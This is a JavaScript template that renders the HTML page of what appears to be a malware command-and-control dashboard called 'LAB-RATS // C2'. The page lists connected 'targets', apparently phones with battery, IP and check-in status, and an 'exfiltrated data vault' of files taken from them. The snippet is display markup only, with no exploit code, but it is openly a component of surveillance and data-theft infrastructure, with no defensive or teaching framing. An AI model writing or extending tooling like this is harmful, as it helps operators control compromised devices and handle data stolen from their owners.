    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LAB-RATS | C2 COMMAND RELAY</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/c2/style.css">
</head>
<body>
    <div class="container">
        <div class="header" style="text-align:center; padding:5px 0; margin-bottom:20px;">
            <h1 class="title-font">LAB-RATS // C2</h1>
            <div class="version-text">SYSTEM ONLINE &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color: var(--success); font-weight: bold;">${onlineCount} / ${deviceList.length}</span></div>
        </div>

        <div class="card">
            <h2 style="color: var(--accent); text-align: center; margin-bottom: 20px; letter-spacing: 2px;">CONNECTED_TARGETS</h2>
            <div style="width: 100%; overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>DEVICE ID</th>
                            <th>MODEL</th>
                            <th>OS VERSION</th>
                            <th>BATTERY</th>
                            <th>ENDPOINT IP</th>
                            <th>STATUS</th>
                            <th>PROFILE</th>
                            <th>LAST CHECK-IN</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${devicesHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()">REFRESH TARGETS</button>
            </div>
        </div>

        <div class="card">
            <h2 style="color: var(--accent); text-align: center; margin-bottom: 5px; letter-spacing: 2px;">EXFILTRATED_DATA_VAULT</h2>
            <div style="text-align: center; color: var(--text-muted); font-size: 0.75rem; margin-bottom: 20px;">TOTAL PAYLOADS: <b style="color: var(--success);">${exfiltratedFiles.length}</b></div>
            <div style="width: 100%; overflow-x: auto;">
                <table>
                    <thead>
                        <tr>
                            <th>FILE NAME</th>
                            <th>TARGET DEVICE</th>
                            <th>FILE SIZE</th>
                            <th>TIMESTAMP</th>
                            <th>ACTION</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${exfilHtml}
                    </tbody>
                </table>
            </div>
            <div style="text-align: center; margin-top: 20px;">
                <button class="btn" onclick="location.reload()">REFRESH VAULT</button>
            </div>
        </div>

        <div class="card" style="text-align: center; color: var(--text-muted); font-size: 0.7rem; margin-top: 30px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; padding: 20px;">
            &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..."
        </div>
    </div>
    
    <script src="/c2/script.js"></script>
</body>
</html>`;
